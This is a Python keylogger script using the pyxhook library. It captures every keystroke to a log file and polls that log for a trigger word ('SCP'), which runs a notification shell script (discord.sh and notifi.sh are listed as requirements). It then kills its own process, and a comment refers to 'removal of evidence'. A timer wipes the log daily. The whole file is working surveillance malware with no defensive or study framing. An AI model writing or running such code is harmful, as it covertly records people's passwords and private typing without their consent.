from subprocess import call
from signal import SIGKILL
import os, sys
import subprocess
import pyxhook
import threading

#REQUIRE
#---- discord.sh
#---- notifi.sh

# This tells the keylogger where the log file will go.
log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('file.log')
)
# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)

# Allow clearing the log file on start, if pylogger_clean is defined.
#export pylogger=yes
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
       # File does not exist, or no permissions.
        pass
  
#creating key pressing event and saving it into log file
def OnKeyPress(event):
    with open(log_file, 'a') as f:
        #f.write('{}\n'.format(event.Key))   #with newline
        f.write('{}'.format(event.Key))
        print('{}'.format(event.Key));
            

def printit():
  threading.Timer(5.0, printit).start()
  try:
       TheFile = open(log_file)
       if("SCP" in TheFile.read()):
            print("SCP Protocol Activated")
            subprocess.call("./notifi.sh")
            
            alert = open("swapit", "x")
            #os.remove(shutit.py)   #Removal of evidence - Should be over shawded by service
            os.kill(os.getpid(), SIGKILL)
  except EnvironmentError:
       pass   # File does not exist, or no permissions.
printit()



def cleanit():
  threading.Timer(86400.0, cleanit).start()
  try:
       os.remove(log_file)
  except EnvironmentError:
       pass   # File does not exist, or no permissions.

cleanit()
  
# create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
# set the hook
new_hook.HookKeyboard()
try:
    new_hook.start()         # start the hook
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
    
        f.write('\n{}'.format(msg))
        
